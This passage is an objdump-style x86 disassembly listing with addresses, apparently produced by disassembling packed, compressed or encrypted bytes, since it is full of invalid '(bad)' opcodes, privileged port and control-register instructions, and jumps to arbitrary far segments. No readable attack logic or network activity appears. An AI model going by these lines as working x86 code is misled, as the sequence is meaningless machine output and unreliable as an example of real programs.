  4097b6:	repnz mov ds:0xa7102881,eax
  4097bc:	mov    bh,0x63
  4097be:	mov    eax,0x791a30c7
  4097c3:	scas   eax,DWORD PTR es:[edi]
  4097c4:	(bad)  
  4097c5:	fimul  WORD PTR [ebx-0x1b]
  4097c8:	retf   0x5d01
  4097cb:	scas   eax,DWORD PTR es:[edi]
  4097cc:	sub    eax,0x4f030acb
  4097d1:	or     ch,bl
  4097d3:	in     eax,dx
  4097d4:	inc    esp
  4097d5:	out    dx,al
  4097d6:	into   
  4097d7:	jmp    0x4097d4
  4097d9:	repz (bad) 
  4097db:	(bad)  [ebp+0x4361202d]
  4097e1:	sub    ecx,esp
  4097e3:	out    0x96,al
  4097e5:	in     al,dx
  4097e6:	sti    
  4097e7:	sbb    eax,0x99d0a5c0
  4097ec:	fldcw  WORD PTR fs:[esi]
  4097ef:	jo     0x409805
  4097f1:	cwde   
  4097f2:	std    
  4097f3:	add    ebx,DWORD PTR [ecx-0x27]
  4097f6:	out    0x21,eax
  4097f8:	add    al,0x21
  4097fa:	cdq    
  4097fb:	cdq    
  4097fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097fd:	arpl   ax,ax
  4097ff:	and    DWORD PTR [eax],0xffffffa3
  409802:	sub    DWORD PTR [esi*1-0x749a3a46],0xffffffea
  40980a:	iret   
  40980b:	sar    DWORD PTR [ecx+0xc],1
  40980e:	sub    cl,0xca
  409811:	aas    
  409812:	mov    edx,0xe1130da8
  409817:	push   ds
  409818:	inc    edi
  409819:	das    
  40981a:	push   ss
  40981b:	loop   0x4097af
  40981d:	and    al,BYTE PTR [eax+ebp*8+0x37711466]
  409824:	pushf  
  409825:	outs   dx,BYTE PTR ds:[esi]
  409826:	sbb    cl,BYTE PTR [ebp-0x1d971e9a]
  40982c:	outs   dx,DWORD PTR ds:[esi]
  40982d:	lahf   
  40982e:	and    esi,DWORD PTR [ebx+0x5eb0ec4d]
  409834:	je     0x409897
  409836:	push   esi
  409837:	test   DWORD PTR [edx+0x57a6cbfa],0xb66e32dc
  409841:	lahf   
  409842:	sbb    bh,dl
  409844:	push   eax
  409845:	jmp    0x4097f2
  409847:	in     al,dx
  409848:	push   ss
  409849:	jbe    0x4098ba
  40984b:	mov    cl,0xa2
  40984d:	pop    eax
  40984e:	mov    dl,al
  409850:	mov    ebp,0x4ad3d37
  409855:	fst    QWORD PTR [edx+0x354ca4ec]
  40985b:	xor    BYTE PTR [edi+0x458b85bb],bh
  409861:	fimul  DWORD PTR [ebx+0x1908d2f3]
  409867:	int    0xbf
  409869:	outs   dx,BYTE PTR ds:[esi]
  40986a:	(bad)  
  40986b:	adc    BYTE PTR [esp+edi*4-0x1f33a86e],dh
  409872:	pop    es
  409873:	aaa    
  409874:	out    0xc0,al
  409876:	daa    
  409877:	sub    DWORD PTR [edx-0x24],ebp
  40987a:	jmp    0x18184313
  40987f:	dec    ebx
  409880:	pop    es
  409881:	test   al,0x4c
  409883:	test   BYTE PTR [edx],ch
  409885:	push   edi
  409886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409887:	cmp    eax,0xfc1499db
  40988c:	lahf   
  40988d:	mov    cl,BYTE PTR [eax-0x4d]
  409890:	pushf  
  409891:	add    DWORD PTR ds:0x91431981,ebp
  409897:	adc    BYTE PTR [esi-0x194e9595],cl
  40989d:	fwait
  40989e:	mov    ebp,0xea8f152f
  4098a3:	pop    edi
  4098a4:	jns    0x409831
  4098a6:	xchg   edx,eax
  4098a7:	and    dl,BYTE PTR [ebx-0xa168c78]
  4098ad:	mov    ds:0xdc14d401,al
  4098b2:	aas    
  4098b3:	inc    ecx
  4098b4:	mov    bh,0xa0
  4098b6:	sub    edi,DWORD PTR [ebp+0x763a4989]
  4098bc:	inc    edx
  4098bd:	pop    esi
  4098be:	imul   ebx,esi,0x75
  4098c1:	or     BYTE PTR [ecx-0x1c],0xb9
  4098c5:	pop    ds
  4098c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098c7:	test   eax,0x80d8e273
  4098cc:	mov    edi,0x5fb49d59
  4098d1:	sbb    esp,edx
  4098d3:	dec    eax
  4098d4:	fisttp WORD PTR [eax]
  4098d6:	jl     0x4098ec
  4098d8:	fadd   DWORD PTR [esi-0x28]
  4098db:	or     eax,ebx
  4098dd:	push   0x2a81cacc
  4098e2:	ja     0x409937
  4098e4:	hlt    
  4098e5:	xchg   BYTE PTR [edx],bl
  4098e7:	shr    BYTE PTR [eax-0x1892a48f],0xf1
  4098ee:	jno    0x4098a5
  4098f0:	xchg   edi,eax
  4098f1:	icebp  
  4098f2:	icebp  
  4098f3:	sbb    al,0x57
  4098f5:	aaa    
  4098f6:	dec    ebp
  4098f7:	xchg   DWORD PTR [eax-0x177fa99c],esi
  4098fd:	jno    0x4098e9
  4098ff:	cmp    esi,DWORD PTR [edx]
  409901:	and    al,0xd2
  409903:	in     eax,dx
  409904:	xor    ah,ch
  409906:	popf   
  409907:	mov    ah,0xf4
  409909:	push   0xffffff8b
  40990b:	repz push esp
  40990d:	outs   dx,BYTE PTR ds:[esi]
  40990e:	(bad)  
  40990f:	dec    eax
  409910:	ins    DWORD PTR es:[edi],dx
  409911:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409912:	adc    ebx,DWORD PTR [edx-0x34]
  409915:	mov    dl,BYTE PTR [edi]
  409917:	(bad)  
  409918:	loopne 0x409973
  40991a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40991b:	ret    
  40991c:	pop    si
  40991e:	xor    al,0x2c
  409920:	jmp    0xf60b8ce0
  409925:	jp     0x4098e3
  409927:	(bad)  
  409928:	int3   
  409929:	or     DWORD PTR [eax],edi
  40992b:	cwde   
  40992c:	test   cl,0x8f
  40992f:	and    dl,BYTE PTR [ebx+0x49]
  409932:	(bad)  
  409933:	jae    0x4098c3
  409935:	mov    ebx,0x1b8bce8a
  40993a:	cmp    cl,dl
  40993c:	pop    esi
  40993d:	and    esp,DWORD PTR [edx-0x59]
  409940:	and    al,0xf6
  409942:	add    DWORD PTR [esi],eax
  409944:	in     eax,dx
  409945:	shr    BYTE PTR [eax-0x3518e5bf],0xb7
  40994c:	or     al,0x76
  40994e:	ins    DWORD PTR es:[edi],dx
  40994f:	xchg   ecx,eax
  409950:	fild   QWORD PTR [esi-0x2a]
  409953:	repz sbb dl,ah
  409956:	jae    0x40991d
  409958:	dec    ebx
  409959:	inc    edi
  40995a:	cmp    ebp,DWORD PTR [esi]
  40995c:	xor    eax,0x50f5364f
  409961:	or     DWORD PTR [ecx],0xffffffca
  409964:	retf   0xff22
  409967:	in     al,dx
  409968:	jmp    0x77ef:0x5168e39d
  40996f:	daa    
  409970:	shl    DWORD PTR [edi-0x26ec9064],1
  409976:	mov    dh,0xe0
  409978:	pop    es
  409979:	xchg   ebx,eax
  40997a:	sbb    DWORD PTR [eax-0x43],eax
  40997d:	mov    WORD PTR [esi+0x62369edb],?
  409983:	out    dx,eax
  409984:	bound  ebx,QWORD PTR [ebp+eax*4-0x71b7af30]
  40998b:	sub    eax,DWORD PTR [edx-0x6]
  40998e:	mov    BYTE PTR ds:0x17f84c8e,al
  409994:	add    eax,0x89de0762
  409999:	daa    
  40999a:	stc    
  40999b:	mov    dh,BYTE PTR [ecx+esi*8+0xc1d83dc]
  4099a2:	or     cl,BYTE PTR [edi+edi*1-0x4c5f7bb7]
  4099a9:	push   ebx
  4099aa:	enter  0x90e6,0xdc
  4099ae:	jne    0x409a2b
  4099b0:	lahf   
  4099b1:	xor    eax,0xe61b2cc1
  4099b6:	sub    eax,0xbbf71b55
  4099bb:	xchg   esp,eax
  4099bc:	push   0xffffffe6
  4099be:	xor    ebx,DWORD PTR [ebp+0x21e0d1ca]
  4099c4:	or     edi,DWORD PTR ds:0xae4f977f
  4099ca:	and    cl,BYTE PTR [ebp+0xe582a5f]
  4099d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099d1:	pop    ss
  4099d2:	gs pop ds
  4099d4:	cmp    eax,0x5ae8fbc5
  4099d9:	mov    ecx,0x2bc7f057
  4099de:	leave  
  4099df:	jmp    0x4099e9
  4099e1:	add    ecx,esp
  4099e3:	test   BYTE PTR [esi],ch
  4099e5:	loopne 0x4099ac
  4099e7:	dec    edi
  4099e8:	or     BYTE PTR ds:0x6d62151f,al
  4099ee:	adc    ecx,DWORD PTR [esi+0x65]
  4099f1:	add    al,0xd0
  4099f3:	outs   dx,DWORD PTR ds:[esi]
  4099f4:	xor    edx,DWORD PTR [ebp+esi*2-0x7a]
  4099f8:	test   BYTE PTR [edi+0x1d],al
  4099fb:	jne    0x4099a7
  4099fd:	push   esi
  4099fe:	mov    ebx,?
  409a00:	jns    0x409a39
  409a02:	pusha  
  409a03:	and    ebp,DWORD PTR [ebx-0x2d]
  409a06:	mov    eax,0x4b65c22a
  409a0b:	and    BYTE PTR [eax],ch
  409a0d:	cld    
  409a0e:	les    eax,FWORD PTR [esi]
  409a10:	adc    BYTE PTR [edx],bl
  409a12:	jb     0x409a85
  409a14:	add    DWORD PTR [ebx-0xae3964d],edx
  409a1a:	daa    
  409a1b:	and    BYTE PTR ds:0x17cf88a8,dh
  409a21:	pop    ecx
  409a22:	pop    ecx
  409a23:	mov    dh,0xa6
  409a25:	jecxz  0x409a69
  409a27:	(bad)  
  409a28:	int    0x3e
  409a2a:	mov    dl,0xe6
  409a2c:	ss int 0x3c
  409a2f:	test   DWORD PTR [ebx+0xb],eax
  409a32:	iret   
  409a33:	in     al,dx
  409a34:	mov    cr0,ecx
  409a37:	jbe    0x409a1f
  409a39:	inc    ecx
  409a3a:	xlat   BYTE PTR ds:[ebx]
  409a3b:	push   ss
  409a3c:	and    ah,BYTE PTR [edi+0x1c]
  409a3f:	mov    ebp,0x7fb54ec8
  409a44:	fimul  DWORD PTR [esi]
  409a46:	iret   
  409a47:	(bad)  
  409a49:	(bad)  
  409a4a:	hlt    
  409a4b:	mov    esp,0x43df97be
  409a50:	jnp    0x409a8a
  409a52:	std    
  409a53:	fsubr  st(7),st
  409a55:	push   es
  409a56:	mov    edx,?
  409a58:	cld    
  409a59:	push   edi
  409a5a:	cmp    BYTE PTR [esi],bl
  409a5c:	mov    BYTE PTR [esi],dl
  409a5e:	dec    esp
  409a5f:	stos   DWORD PTR es:[edi],eax
  409a60:	(bad)  
  409a61:	int3   
  409a62:	int3   
  409a63:	sub    al,0x20
  409a65:	pop    ebp
  409a66:	jge    0x409a73
  409a68:	lea    esp,[esp+ebx*1]
  409a6b:	bound  ebx,QWORD PTR [ebp-0x14]
  409a6e:	cmc    
  409a6f:	mov    cl,0xb2
  409a71:	stos   DWORD PTR es:[edi],eax
  409a72:	pop    DWORD PTR [eax-0x3911e421]
  409a78:	or     al,0xe1
  409a7a:	pop    ebp
  409a7b:	sbb    edi,0xffffffaa
  409a7e:	jns    0x409a63
  409a80:	mov    esi,0x68f1f95c
  409a85:	scas   eax,DWORD PTR es:[edi]
  409a86:	jle    0x409a27
  409a88:	fidivr WORD PTR [esi+ebx*4-0x2285b873]
  409a8f:	clc    
  409a90:	ret    
  409a91:	push   edx
  409a92:	xchg   ebp,eax
  409a93:	cmp    DWORD PTR [eax-0xe6b9f02],ecx
  409a99:	or     DWORD PTR [ebx-0x4e],esi
  409a9c:	addr16 icebp 
  409a9e:	jmp    0xa963:0x5b3beee9
  409aa5:	sub    dl,al
  409aa7:	pop    edi
  409aa8:	jno    0x409afe
  409aaa:	repnz mov dl,0x9a
  409aad:	je     0x409a72
  409aaf:	cmc    
  409ab0:	push   ds
  409ab1:	cmp    ebx,DWORD PTR [ebp+0x2]
  409ab4:	lahf   
  409ab5:	jecxz  0x409acc
  409ab7:	inc    edx
  409ab8:	dec    edi
  409ab9:	sar    ebx,0x40
  409abc:	or     DWORD PTR [eax-0x41bffe7b],eax
  409ac2:	pop    edx
  409ac3:	jge    0x409a4c
  409ac5:	mov    eax,ds:0x64419a6f
  409aca:	push   0x443487de
  409acf:	sbb    esi,DWORD PTR [esi+0x42b93806]
  409ad5:	in     eax,dx
  409ad6:	push   cs
  409ad7:	jns    0x409af1
  409ad9:	js     0x409b4f
  409adb:	pop    ds
  409adc:	sub    DWORD PTR [eax-0x32ddb7fc],ecx
  409ae2:	repnz leave 
  409ae4:	sbb    edx,DWORD PTR [edi+esi*2+0x777594de]
  409aeb:	xchg   edi,eax
  409aec:	test   BYTE PTR [esp+esi*4+0x9687c1e],dh
  409af3:	mov    cl,0x50
  409af5:	sub    eax,0xad894977
  409afa:	mov    bl,0x16
  409afc:	or     ecx,edi
  409afe:	xchg   esi,eax
  409aff:	pop    ebx
  409b00:	cmp    ch,BYTE PTR [edx+ecx*4+0x48e82a3e]
  409b07:	pushf  
  409b08:	sti    
  409b09:	xor    ebp,DWORD PTR [edx-0x7bcf2d96]
  409b0f:	xor    al,BYTE PTR ds:0xc724c2ae
  409b15:	inc    ebp
  409b16:	rol    DWORD PTR [ebp-0x426a9cf3],1
  409b1c:	xchg   DWORD PTR [ebx],esi
  409b1e:	fmul   QWORD PTR [esp+eax*8-0x5d1dee4e]
  409b25:	sbb    eax,0x16e50b29
  409b2a:	jb     0x409b7e
  409b2c:	inc    edx
  409b2d:	ins    BYTE PTR es:[edi],dx
  409b2e:	mov    edx,0x503366ea
  409b33:	test   bl,al
  409b35:	xor    dl,0x48
  409b38:	sub    eax,0x448d192e
  409b3d:	add    ah,bh
  409b3f:	sub    BYTE PTR [ebp-0x3c8cafa3],cl
  409b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b46:	fs (bad) 
  409b48:	and    al,0xf7
  409b4a:	sub    eax,0x521227bf
  409b4f:	into   
  409b50:	fdivr  st,st(4)
  409b52:	pop    es
  409b53:	jge    0x409b9a
  409b55:	mov    WORD PTR [ebp-0x439003f8],es
  409b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b5c:	and    cl,BYTE PTR ds:0x814551d7
  409b62:	inc    eax
  409b63:	out    dx,eax
  409b64:	aam    0xc1
  409b66:	sub    DWORD PTR [edi+0x478d65ec],0xce95bf08
  409b70:	jnp    0x409b27
  409b72:	dec    edx
  409b73:	fs inc esi
  409b75:	push   edx
  409b76:	pop    eax
  409b77:	into   
  409b78:	sub    al,0x47
  409b7a:	dec    ecx
  409b7b:	ja     0x409bd6
  409b7d:	push   ds
  409b7e:	push   0x50
  409b80:	xor    ebp,0x62
  409b83:	jnp    0x409b56
  409b85:	mov    esp,DWORD PTR [ebx]
  409b87:	adc    eax,0xa1eef9d1
  409b8c:	aas    
  409b8d:	pop    esp
  409b8e:	enter  0x926a,0xcc
  409b92:	out    dx,al
  409b93:	inc    ebx
  409b94:	jbe    0x409b7e
  409b96:	out    0xbd,al
  409b98:	xchg   ecx,eax
  409b99:	push   edx
  409b9a:	mov    esi,0xf1458cdb
  409b9f:	into   
  409ba0:	hlt    
  409ba1:	or     eax,DWORD PTR [eax+ebx*2]
  409ba4:	xor    cl,0xff
  409ba7:	cdq    
  409ba8:	mov    edx,0x5d84c0e0
  409bad:	mov    eax,0x335d6479
  409bb2:	jb     0x409c14
  409bb4:	cmp    al,0x93
  409bb6:	stc    
  409bb7:	jmp    0x8e31344b
  409bbc:	push   cs
  409bbd:	jp     0x409b53
  409bbf:	add    eax,0xfc5f826a
  409bc4:	dec    edx
  409bc5:	cmp    al,0x8b
  409bc7:	leave  
  409bc8:	call   0x8e84:0x44b1bd36
  409bcf:	in     al,0xd9
  409bd1:	adc    DWORD PTR [ecx],ecx
  409bd3:	lods   eax,DWORD PTR ds:[esi]
  409bd4:	cmp    al,0xc7
  409bd6:	fadd   st,st(7)
  409bd8:	daa    
  409bd9:	pop    edx
  409bda:	xor    DWORD PTR [edi+ecx*1+0x6e],ebx
  409bde:	mov    al,0x97
  409be0:	push   esp
  409be1:	rol    DWORD PTR [edi-0x47],1
  409be4:	dec    edi
  409be5:	push   ecx
  409be6:	push   0xa61df30c
  409beb:	in     eax,0x4a
  409bed:	mov    WORD PTR [edi+eax*2-0x3bd5b821],?
  409bf4:	sbb    DWORD PTR [ecx-0x11],0xc
  409bf8:	sbb    DWORD PTR [ecx],edi
  409bfa:	or     eax,0x4fde43a3
  409bff:	(bad)  
  409c00:	cmc    
  409c01:	mov    cl,0xc5
  409c03:	ins    DWORD PTR es:[edi],dx
  409c04:	pop    ebp
  409c05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c06:	addr16 cmp bh,bh
  409c09:	bound  esp,QWORD PTR [ecx]
  409c0b:	(bad)  
  409c0c:	mov    al,ds:0x8dbfecb2
  409c11:	jb     0x409c33
  409c13:	inc    eax
  409c14:	dec    ecx
  409c16:	cld    
  409c17:	mov    bh,0x7a
  409c19:	xchg   edx,eax
  409c1a:	das    
  409c1b:	inc    esi
  409c1c:	push   edi
  409c1d:	and    BYTE PTR [ebp-0x7c],cl
  409c20:	sar    esp,0x19
  409c23:	xor    ch,BYTE PTR [edi+0x5d395d1e]
  409c29:	add    edx,esi
  409c2b:	sbb    DWORD PTR [edi],0xc3a89885
  409c31:	and    BYTE PTR [ebp-0x55],0x0
  409c35:	sti    
  409c36:	xchg   DWORD PTR [ecx+0x30cb393],esi
  409c3c:	pushf  
  409c3d:	popa   
  409c3e:	test   dl,cl
  409c40:	mov    esp,cs
  409c42:	ror    BYTE PTR [ebx-0x3a],1
  409c45:	repnz outs dx,BYTE PTR ds:[esi]
  409c47:	addr16 push edi
  409c49:	fst    DWORD PTR [esi]
  409c4b:	aam    0x4c
  409c4d:	xchg   edx,eax
  409c4e:	jnp    0x409c89
  409c50:	ja     0x409bd3
  409c52:	lock in al,0xee
  409c55:	cmp    ch,ch
  409c57:	push   ss
  409c58:	not    BYTE PTR [ecx+edi*8-0x58]
  409c5c:	rol    DWORD PTR [eax],cl
  409c5e:	ja     0x409c28
  409c60:	iret   
  409c61:	(bad)  
  409c63:	push   ds
  409c64:	adc    BYTE PTR [esi],bl
  409c66:	test   BYTE PTR [eax+edi*8],cl
  409c69:	into   
  409c6a:	fstp   st(0)
  409c6c:	inc    ebp
  409c6d:	sbb    dl,cl
  409c6f:	mov    ebx,DWORD PTR [edi-0x3d82b9f7]
  409c75:	mov    ah,0x1
  409c77:	xchg   esp,eax
  409c78:	jecxz  0x409c54
  409c7a:	add    DWORD PTR [edi-0x1fe4ccb1],0xf25dc81c
  409c84:	aam    0x1c
  409c86:	out    0x2c,al
  409c88:	push   esi
  409c89:	outs   dx,BYTE PTR ds:[esi]
  409c8a:	inc    edi
  409c8b:	push   ebp
  409c8c:	sbb    edx,DWORD PTR [ebp+0x254865f6]
  409c92:	xor    eax,0x3d603544
  409c97:	dec    esp
  409c98:	mov    dl,0x58
  409c9a:	pop    ss
  409c9b:	dec    ebx
  409c9c:	adc    eax,0xd56c62ac
  409ca1:	cmp    bl,BYTE PTR [edi]
  409ca3:	imul   eax,DWORD PTR [ecx],0x1239744f
  409ca9:	pusha  
  409caa:	rcr    DWORD PTR [eax],0xd7
  409cad:	jae    0x409c93
  409caf:	or     esi,DWORD PTR [ebx+0x77]
  409cb2:	sub    BYTE PTR [esi-0x1a7c5358],dl
  409cb8:	cmp    edx,ecx
  409cba:	or     al,0x24
  409cbc:	fsub   DWORD PTR [edx]
  409cbe:	iret   
  409cbf:	cmp    al,0xda
  409cc1:	jo     0x409c5e
  409cc3:	dec    esp
  409cc4:	(bad)  
  409cc5:	fs call 0x15ff68a8
  409ccb:	jo     0x409ce3
  409ccd:	sbb    BYTE PTR [ebx+ecx*4-0x4],0xed
  409cd2:	dec    esi
  409cd3:	repnz mov eax,ds:0x7e4ee0bb
  409cd9:	push   cs
  409cda:	mov    ch,0xc2
  409cdc:	mov    al,0x2e
  409cde:	dec    ebx
  409cdf:	gs pop ds
  409ce1:	jne    0x409cdc
  409ce3:	mov    ecx,0xc08b313d
  409ce8:	and    DWORD PTR ds:0x7220a1af,0x4
  409cef:	icebp  
  409cf0:	xchg   esi,eax
  409cf1:	int    0xc0
  409cf3:	jns    0x409cb9
  409cf5:	mov    eax,0x99ac2045
  409cfa:	sbb    DWORD PTR [ecx+0x7b40269],0xffffffc1
  409d01:	xor    eax,DWORD PTR [eax]
  409d03:	sbb    cl,bh
  409d05:	jecxz  0x409d59
  409d07:	retf   
  409d08:	or     esi,edi
  409d0a:	jl     0x409d56
  409d0c:	outs   dx,BYTE PTR ds:[esi]
  409d0d:	in     al,0xf5
  409d0f:	in     eax,0x33
  409d11:	icebp  
  409d12:	inc    esi
  409d13:	out    dx,eax
  409d14:	inc    esp
  409d15:	icebp  
  409d16:	adc    ebp,DWORD PTR ds:0x4f1882c1
  409d1c:	inc    ecx
  409d1d:	ss add al,0x95
  409d20:	sahf   
  409d21:	je     0x409d60
  409d23:	sbb    al,0x68
  409d25:	fdivr  st(7),st
  409d27:	jno    0x409d3e
  409d29:	sub    BYTE PTR [ebx-0x487c572e],ah
  409d2f:	pop    es
  409d30:	iret   
  409d31:	adc    DWORD PTR [eax-0x315508b2],ebx
  409d37:	sbb    al,0x5f
  409d39:	sar    BYTE PTR [edi],1
  409d3b:	test   BYTE PTR [ebx-0x65],dh
  409d3e:	mov    WORD PTR [ebx],?
  409d40:	pop    ds
  409d41:	sub    al,0x8b
  409d43:	aad    0x7a
  409d45:	jmp    0x89c:0x1a7a1ae6
  409d4c:	jae    0x409dcc
  409d4e:	mul    edi
  409d50:	add    eax,0x70fcdff
  409d55:	leave  
  409d56:	mov    eax,ds:0xb45b5aa0
  409d5b:	jns    0xdb611fc5
  409d61:	ins    DWORD PTR es:[edi],dx
  409d62:	dec    ebp
  409d63:	and    DWORD PTR [ebx+0x6c],edx
  409d66:	mov    eax,0x282eb029
  409d6b:	mov    ds:0x2eca254e,al
  409d70:	push   ds
  409d71:	call   0x96468b78
  409d76:	aam    0xa1
  409d78:	(bad)  
  409d79:	fidivr WORD PTR [edx]
  409d7b:	inc    edx
  409d7c:	adc    al,cl
  409d7e:	cld    
  409d7f:	jle    0x409d41
  409d81:	and    BYTE PTR [ebx+0x66],dl
  409d84:	fstp   QWORD PTR [edi]
  409d86:	push   esp
  409d87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d88:	inc    esp
  409d89:	and    DWORD PTR [ecx+0x61b291f8],esp
  409d8f:	sbb    BYTE PTR [ecx+ebp*1-0x6f],0xea
  409d94:	lea    edi,ds:0x950d30fe
  409d9a:	fs cmp al,ch
  409d9d:	push   esp
  409d9e:	mov    bl,0x42
  409da0:	or     al,0xf4
  409da2:	jmp    0x409dbc
  409da4:	add    BYTE PTR [edx+esi*4-0x10],bl
  409da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409da9:	cmp    edx,ecx
  409dab:	jne    0x409e20
  409dad:	push   0x7682b8c3
  409db2:	inc    ecx
  409db3:	cmp    eax,0x70819777
  409db8:	add    ah,BYTE PTR cs:[esi-0x50]
  409dbc:	lds    edx,FWORD PTR ds:0x6c41e33c
  409dc2:	aad    0x30
  409dc4:	jns    0x409e20
  409dc6:	inc    edi
  409dc7:	and    DWORD PTR [esp+edi*8],esi
  409dca:	dec    ebx
  409dcb:	add    eax,0x6d6f6842
  409dd0:	sar    DWORD PTR [esi-0x5],1
  409dd3:	xor    ah,al
  409dd5:	sub    al,0x25
  409dd7:	mov    eax,0xd9683796
  409ddc:	push   ebp
  409ddd:	xor    ch,bh
  409ddf:	clc    
  409de0:	mov    dl,BYTE PTR [ecx+0xc]
  409de3:	ds fsub st(0),st
  409de6:	adc    BYTE PTR [esi-0x33],dl
  409de9:	les    edx,FWORD PTR [eax]
  409deb:	stos   BYTE PTR es:[edi],al
  409dec:	inc    eax
  409ded:	in     al,dx
  409dee:	adc    eax,edx
  409df0:	xchg   ebp,eax
  409df1:	stos   BYTE PTR es:[edi],al
  409df2:	or     al,BYTE PTR ds:0x95c838fb
  409df8:	imul   edx,eax,0x29bee9ed
  409dfe:	push   cs
  409dff:	lahf   
  409e00:	push   edx
  409e01:	xchg   edi,eax
  409e02:	mov    ss,ecx
  409e04:	not    DWORD PTR [ebx]
  409e06:	jle    0x409d91
  409e08:	cwde   
  409e09:	ins    DWORD PTR es:[edi],dx
  409e0a:	pop    edx
  409e0b:	dec    ebx
  409e0c:	std    
  409e0d:	adc    edi,DWORD PTR [ebp-0x67bbd79]
  409e13:	cmp    edi,esi
  409e15:	mov    ds:0xd8f7fd53,al
  409e1a:	add    al,0x6b
  409e1c:	inc    ecx
  409e1d:	pop    esp
  409e1e:	jle    0x409e0b
  409e20:	adc    ebx,ebp
  409e22:	popa   
  409e23:	jle    0x409dd2
  409e25:	retf   0x7b24
  409e28:	sub    al,0x81
  409e2a:	leave  
  409e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e2c:	hlt    
  409e2d:	loopne 0x409e11
  409e2f:	ss push es
  409e31:	(bad)  
  409e32:	daa    
  409e33:	pusha  
  409e34:	pop    ds
  409e35:	call   0xafacec53
  409e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e3b:	sbb    BYTE PTR [ecx],al
  409e3d:	mov    eax,ds:0xdc5c22b5
  409e42:	daa    
  409e43:	jmp    0xdbf3:0x2df8c4a3
  409e4a:	and    bl,ch
  409e4c:	in     eax,0xb6
  409e4e:	xor    ah,al
  409e50:	mov    ah,0x7b
  409e52:	push   eax
  409e53:	jmp    DWORD PTR [eax+0x6e]
  409e56:	jmp    0x409e3a
  409e58:	mov    WORD PTR [ebx-0x7c],gs
  409e5b:	xor    dl,BYTE PTR [eax-0x32]
  409e5e:	fcom   st(6)
  409e60:	add    DWORD PTR [ebx-0x5aa5f301],edi
  409e66:	push   esp
  409e67:	test   DWORD PTR ds:0xd3e8da2f,esi
  409e6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e6e:	mov    bl,0x6c
  409e70:	sub    DWORD PTR ds:0xd1a92c35,esi
  409e76:	jne    0x409e0e
  409e78:	nop
  409e79:	cld    
  409e7a:	jp     0x409e1b
  409e7c:	cmc    
  409e7d:	popf   
  409e7e:	dec    ax
  409e80:	or     DWORD PTR [edx-0x3df31f48],ebx
  409e86:	shl    BYTE PTR [ecx+edi*1+0x16],0x28
  409e8b:	jns    0x409ec3
  409e8d:	adc    edi,DWORD PTR [eax]
  409e8f:	add    eax,0x6615d265
  409e94:	add    BYTE PTR [ebx+0x4dcd0828],ah
  409e9a:	pop    edx
  409e9b:	nop
  409e9c:	mul    BYTE PTR [ebx+0x6380a29d]
  409ea2:	xchg   edi,eax
  409ea3:	lods   eax,DWORD PTR ds:[esi]
  409ea4:	mov    esp,0x4428482a
  409ea9:	inc    edx
  409eaa:	leave  
  409eab:	xchg   esi,eax
  409eac:	pop    ecx
  409ead:	sahf   
  409eae:	repz push esi
  409eb0:	add    ebp,DWORD PTR [esi]
  409eb2:	retf   0xbd2f
  409eb5:	leave  
  409eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409eb7:	xchg   edi,eax
  409eb8:	add    al,0x51
  409eba:	sbb    eax,0x373ddfda
  409ebf:	add    DWORD PTR ds:0xbc5fbcb9,ebx
  409ec5:	out    0xe4,eax
  409ec7:	mov    ds:0xd7d4af4e,eax
  409ecc:	add    bl,BYTE PTR [eax-0x6a]
  409ecf:	std    
  409ed0:	mov    BYTE PTR [esi+0x36],dl
  409ed3:	(bad)  
  409ed5:	pushf  
  409ed6:	xchg   BYTE PTR [ebx],bl
  409ed8:	stos   DWORD PTR es:[edi],eax
  409ed9:	shr    DWORD PTR [edi],1
  409edb:	fcom   DWORD PTR [edx+0x5df05842]
  409ee1:	or     al,0xc
  409ee3:	ins    BYTE PTR es:[edi],dx
  409ee4:	cmc    
  409ee5:	mov    dh,0x9e
  409ee7:	popa   
  409ee8:	push   ebp
  409ee9:	loope  0x409f64
  409eeb:	jno    0x409f20
  409eed:	jns    0x409f3e
  409eef:	mov    ebx,0xd07a0335
  409ef4:	std    
  409ef5:	(bad)  
  409ef6:	jg     0x409eb0
  409ef8:	and    al,0xba
  409efa:	push   edi
  409efb:	xchg   BYTE PTR [edx],ah
  409efd:	mov    al,ds:0xffbea998
  409f02:	xchg   edx,eax
  409f03:	ret    0xf22a
  409f06:	xchg   BYTE PTR [esi+0x171adbdc],bl
  409f0c:	jo     0x409f46
  409f0e:	ja     0x409f5e
  409f10:	xchg   ecx,eax
  409f11:	stos   DWORD PTR es:[edi],eax
  409f12:	daa    
  409f13:	out    0xce,al
  409f15:	add    DWORD PTR [edx+0xf],eax
  409f18:	mov    ebx,0x308ac1d0
  409f1d:	mov    ds:0x6e0a8d08,al
  409f22:	xchg   BYTE PTR [edx],cl
  409f24:	icebp  
  409f25:	(bad)  
  409f26:	xor    esp,DWORD PTR [edx-0x7062a472]
  409f2c:	push   cs
  409f2d:	out    0x91,eax
  409f2f:	sti    
  409f30:	pop    ss
  409f31:	inc    ebx
  409f32:	fwait
  409f33:	push   ebx
  409f34:	mov    eax,DWORD PTR [edi-0x7cee75e8]
  409f3a:	(bad)  
  409f3c:	jge    0x409f33
  409f3e:	cwde   
  409f3f:	nop
  409f40:	imul   eax,DWORD PTR [edi],0xac694976
  409f46:	mov    eax,0xb8ea9fbc
  409f4b:	loopne 0x409f68
  409f4d:	sbb    eax,DWORD PTR ds:0x4c23cfb9
  409f53:	push   ebx
  409f54:	and    BYTE PTR [edi+ebx*4+0x5b],0xb2
  409f59:	jmp    0x9457:0x2d008fc6
  409f60:	imul   edx,eax,0x2bda7d3d
  409f66:	cwde   
  409f67:	jecxz  0x409f67
  409f69:	int3   
  409f6a:	xchg   edi,eax
  409f6b:	or     DWORD PTR [edx],edi
